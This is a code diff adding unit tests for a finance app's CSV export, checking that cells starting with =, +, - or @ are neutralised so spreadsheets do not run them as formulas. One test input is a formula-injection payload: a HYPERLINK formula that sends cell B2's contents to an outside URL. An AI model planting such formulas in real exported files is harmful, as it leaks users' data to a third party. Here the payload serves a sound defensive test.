@@ -13,6 +13,7 @@ import {
   summarise,
   looksLikeHeader,
   guessMapping,
+  toCsv,
   type ColumnMapping,
 } from './csvImport';
 import type { Transaction } from '../types/finance';
@@ -439,5 +440,21 @@ describe('amountsInBase', () => {
 
   it('imports nothing when a rate is missing', () => {
     expect(amountsInBase([1000], 'SEK', 'EUR', convert)).toBeNull();
+  });
+});
+
+describe('toCsv formula neutralisation (limecore#99)', () => {
+  const tx = (description: string, notes = ''): Transaction =>
+    ({ id: 'x', type: 'expense', amount: 12, date: '2026-11-01', description, notes }) as unknown as Transaction;
+
+  it('prefixes text cells that a spreadsheet would run as a formula', () => {
+    const out = toCsv([tx('=HYPERLINK("https://e/?"&B2,"x")', '+1'), tx('@SUM(A1)', '-2')], () => 'Food');
+    const lines = out.split('\n');
+    expect(lines[1]).toBe(`2026-11-01,"'=HYPERLINK(""https://e/?""&B2,""x"")",-12.00,Food,'+1`);
+    expect(lines[2]).toBe("2026-11-01,'@SUM(A1),-12.00,Food,'-2");
+  });
+
+  it('leaves ordinary text and the numeric amount alone', () => {
+    expect(toCsv([tx('Coffee')], () => 'Food').split('\n')[1]).toBe('2026-11-01,Coffee,-12.00,Food,');
   });
 });
